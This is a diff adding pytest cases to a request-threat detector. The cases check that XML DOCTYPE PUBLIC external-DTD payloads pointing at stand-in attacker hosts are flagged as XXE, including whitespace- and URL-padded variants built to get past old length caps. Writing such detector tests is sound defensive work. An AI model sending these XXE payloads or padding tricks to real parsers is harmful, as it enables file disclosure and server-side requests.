@@ -1,6 +1,42 @@
 import pytest
 
 from guard_core.handlers.suspatterns_handler import sus_patterns_handler
+from guard_core.models import SecurityConfig
+
+PUBLIC_DTD_PAYLOADS_FLAGGED = [
+    pytest.param(
+        '<!DOCTYPE foo PUBLIC "-//X//Y" "http://evil.example.com/evil.dtd">',
+        id="public_external_dtd_basic",
+    ),
+    pytest.param(
+        '<!DOCTYPE data PUBLIC "-//A//B//EN" "https://attacker.example/evil.dtd">',
+        id="public_external_dtd_https",
+    ),
+]
+
+PUBLIC_DTD_PADDED_SHAPES_FLAGGED = [
+    pytest.param(129, 10, 10, id="129sp_after_doctype_and_public"),
+    pytest.param(4096, 10, 10, id="4096sp_after_doctype_and_public"),
+    pytest.param(10, 513, 10, id="513char_url"),
+    pytest.param(10, 8192, 10, id="8192char_url"),
+    pytest.param(10, 10, 129, id="129_trailing"),
+    pytest.param(10, 10, 4096, id="4096_trailing"),
+    pytest.param(4096, 8192, 4096, id="all_maxed"),
+]
+
+
+def _padded_public_dtd(gap1: int, gap2: int, gap3: int) -> str:
+    return (
+        "<!DOCTYPE"
+        + " " * gap1
+        + "PUBLIC"
+        + " " * gap1
+        + '"-//X//Y" "http://evil.example/'
+        + "a" * gap2
+        + '.dtd"'
+        + " " * gap3
+        + ">"
+    )
 
 XXE_PAYLOADS_FLAGGED = [
     pytest.param(
@@ -93,3 +129,27 @@ async def test_ordinary_xml_not_flagged(payload: str) -> None:
         content=payload, ip_address="198.51.100.4", context="request_body"
     )
     assert result["is_threat"] is False
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("payload", PUBLIC_DTD_PAYLOADS_FLAGGED)
+async def test_public_dtd_payload_flagged_as_xml(payload: str) -> None:
+    result = await sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="request_body"
+    )
+    assert result["is_threat"] is True
+    assert any(threat.get("category") == "xml" for threat in result["threats"])
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("gap1,gap2,gap3", PUBLIC_DTD_PADDED_SHAPES_FLAGGED)
+async def test_public_dtd_payload_flagged_past_every_old_cap(
+    gap1: int, gap2: int, gap3: int
+) -> None:
+    sus_patterns_handler.configure(SecurityConfig(detection_max_content_length=30000))
+    payload = _padded_public_dtd(gap1, gap2, gap3)
+    result = await sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="request_body"
+    )
+    assert result["is_threat"] is True
+    assert any(threat.get("category") == "xml" for threat in result["threats"])
